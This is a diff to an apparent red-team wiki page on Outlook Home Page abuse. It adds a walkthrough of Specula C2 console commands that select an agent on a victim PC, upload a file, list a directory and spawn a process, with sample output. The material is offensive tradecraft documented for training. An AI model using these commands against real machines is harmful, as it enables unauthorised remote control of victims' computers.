@@ -1,4 +1,4 @@
-# Outlook Home Page Abuse - Specula
+# Outlook Home Page Abuse (Specula)
 
 ## Theory
 
@@ -90,7 +90,46 @@ Agent will be approved on next callback
 {% endtab %}
 
 {% tab title="Execute" %}
-TODO
+### Select Agent
+
+In order to assign tasks to agents and execute code, we first need to select it
+
+```powershell
+# List agents
+id  hostname:username             ip address        refreshTime  Lastseen              approved    encryptionkey            api installed/verified
+1   DEMO-VICTIME-PC:User          192.168.206.172   10           08/14/2024-11:51:21   YES         HNjPsC0pruHvYPTTZVXpAA   False/False
+
+# Select agent
+SpeculaC2> interact 1
+```
+
+### Execute a module
+
+```powershell
+# Upload a file
+SpeculaC2:hostname>usemodule operation/file/put_file
+SpeculaC2:hostname:operation/file/put_file>set file /tmp/file2upload.txt
+SpeculaC2:hostname:operation/file/put_file>set destination c:\temp\file2upload.txt
+SpeculaC2:hostname:operation/file/put_file>run
+Module operation/file/put_file added to execution queue
+SpeculaC2:hostname>07/24/2024-08:02:30 - Finished uploading file to hostname at c:\temp\file2upload.txt - Sizes match: server:7 - agent:7
+
+# Directory listing
+SpeculaC2:hostname>usemodule operation/file/list_dir
+SpeculaC2:hostname:operation/file/list_dir>set directory c:\temp
+SpeculaC2:hostname:operation/file/list_dir>run
+Module operation/file/list_dir added to execution queue
+SpeculaC2:hostname>data
+07/24/2024-07:59:29 -- operation/file/list_dir
+Parent Folder: c:\temp
+F: C:\temp\importantfile.txt - Size: 0mb - LastModified: 7/22/2024 1:19:18 PM
+
+# Spawn a process
+SpeculaC2:hostname>usemodule execute/host/spawnproc_explorer
+SpeculaC2:hostname:execute/host/spawnproc_explorer>set command c:\windows\system32\msiexec.exe
+SpeculaC2:hostname:execute/host/spawnproc_explorer>set arguments /?
+SpeculaC2:hostname:execute/host/spawnproc_explorer>run
+```
 {% endtab %}
 {% endtabs %}
 
